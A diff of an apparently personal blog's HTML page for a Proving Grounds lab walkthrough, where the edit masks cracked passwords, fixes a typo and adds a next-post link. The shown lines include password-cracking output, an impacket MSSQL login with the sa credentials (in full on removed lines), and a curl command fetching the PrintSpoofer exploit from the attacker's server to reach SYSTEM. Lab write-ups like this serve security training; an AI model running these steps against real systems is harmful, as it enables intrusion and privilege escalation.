@@ -387,7 +387,7 @@ Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32768 
 Will run 4 OpenMP threads
 Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
 0g 0:00:02:32 0.44% <span class="o">(</span>ETA: 15:23:03<span class="o">)</span> 0g/s 499.2p/s 499.2c/s 499.2C/s jesus89..isaiah04
-letmeinplease    <span class="o">(</span>MSSQL_BAK.rar<span class="o">)</span>     
+letme<span class="k">*******</span>   <span class="o">(</span>MSSQL_BAK.rar<span class="o">)</span>     
 1g 0:00:04:39 DONE <span class="o">(</span>2022-11-13 05:53<span class="o">)</span> 0.003580g/s 497.5p/s 497.5c/s 497.5C/s lily03..lerner
 Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
 Session completed. 
@@ -397,14 +397,14 @@ Session completed.
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ cat mssql_backup.txt 
 Username: sa
-Password: EjectFrailtyThorn425   
+Password: Eject******
 </code></pre></div></div>
 
 <h3 id="mssql-1435">MSSQL 1435</h3>
 
 <p>Using credentials from FTP I was able to get command execution</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ impacket-mssqlclient sa:EjectFrailtyThorn425@192.168.209.70 -port 1435
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ impacket-mssqlclient sa:Eject****@192.168.209.70 -port 1435
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
@@ -481,7 +481,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 </code></pre></div></div>
 
-<p>I noticed that user had <strong>SeImpersonatePrivilege</strong>. And straight away I attempted to exploit <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>vulnability. I changed my Webserver to use port 80 and downloaded the exploit to temp directory I created in C disk.</p>
+<p>I noticed that user had <strong>SeImpersonatePrivilege</strong>. And straight away I attempted to exploit <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> vulnerability. I changed my Webserver to use port 80 and downloaded the exploit to temp directory I created in C disk.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\temp&gt;curl http://192.168.49.209/PrintSpoofer64.exe -o spoofer.exe
 curl http://192.168.49.209/PrintSpoofer64.exe -o spoofer.exe
@@ -570,6 +570,10 @@ nt authority\system
           <a class="page-link" href="/2022-11-12-PG-Walla/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - Walla">&larr; Previous Post</a>
         </li>
         
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2022-11-14-PG-Pelican/" data-toggle="tooltip" data-placement="top" title="Proving Grounds - Pelican">Next Post &rarr;</a>
+        </li>
         
       </ul>
       
